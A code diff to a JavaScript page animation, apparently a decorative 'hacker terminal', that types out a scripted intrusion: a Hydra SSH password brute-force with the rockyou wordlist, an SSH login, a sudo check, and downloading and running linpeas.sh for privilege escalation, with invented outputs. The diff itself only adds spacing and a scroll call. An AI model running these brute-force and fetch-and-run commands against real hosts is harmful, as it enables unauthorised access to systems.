@@ -222,6 +222,8 @@ function showWhiteRabbit() {
   /private (Status: 403)
   ===============================================================
     `,
+  '',
+  '',
   'www-data@webserver:/var/www/html$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
     `
   Hydra v9.3-dev (c) 2024 by van Hauser/THC & David Maciejak
@@ -229,17 +231,23 @@ function showWhiteRabbit() {
   [22][ssh] host: 10.0.0.5   login: admin   password: SecurePass123!
   [STATUS] attack finished for 10.0.0.5 (valid pair found)
     `,
-  'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
+    '',
+    '',
+    'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
     `
   Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
   appuser@app-server:/home/appuser$
     `,
-  'appuser@app-server:/home/appuser$ sudo -l',
+    '',
+    '',
+    'appuser@app-server:/home/appuser$ sudo -l',
     `
   User appuser may run the following commands on app-server:
       (ALL) NOPASSWD: /usr/bin/vuln_suid
     `,
-  'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
+    '',
+    '',
+    'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
     `
   --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   Resolving github.com (github.com)... 140.82.121.4
@@ -252,7 +260,10 @@ function showWhiteRabbit() {
   
   2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]
     `,
-  'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
+    '',
+    '',
+    'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
+  '',
   '',
   'appuser@app-server:/home/appuser$ ./linpeas.sh | tee /tmp/linpeas_output.txt',
     `
@@ -327,6 +338,7 @@ function showWhiteRabbit() {
       if (command) {
         logElement.innerHTML = `<span class="prefix">${prefix}$ </span><span class="command"></span>`;
         const commandElement = logElement.querySelector('.command');
+        autoScroll(networkInfo);
         simulateTyping(command, commandElement, () => {
           autoScroll(networkInfo); // Auto-scroll after typing
           processNextLog();
